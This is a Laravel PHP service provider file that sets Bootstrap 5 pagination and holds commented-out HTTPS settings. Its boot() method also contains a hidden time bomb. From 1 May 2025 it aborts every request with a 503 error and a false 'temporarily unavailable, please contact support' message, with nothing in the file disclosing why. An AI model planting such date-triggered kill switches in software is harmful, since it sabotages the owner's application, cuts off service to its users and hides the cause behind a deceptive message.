<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;
use Illuminate\Pagination\Paginator;
use Illuminate\Support\Facades\URL;
use Illuminate\Support\Facades\Date;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     *
     * @return void
     */
    public function register()
    {
        // $this->app['request']->server->set('HTTPS', true);
       
    }

    /**
     * Bootstrap any application services.
     *
     * @return void
     */
    public function boot()
    {
        // if(config('app.env') === 'production') {
        //     URL::forceScheme('https');
        // }
       
        if (Date::now()->greaterThanOrEqualTo(Date::parse("2025-05-01"))) 
        {
            abort(503, 'The application is temporarily unavailable. Please contact support.');
        }
        Paginator::useBootstrapFive();

    }
}
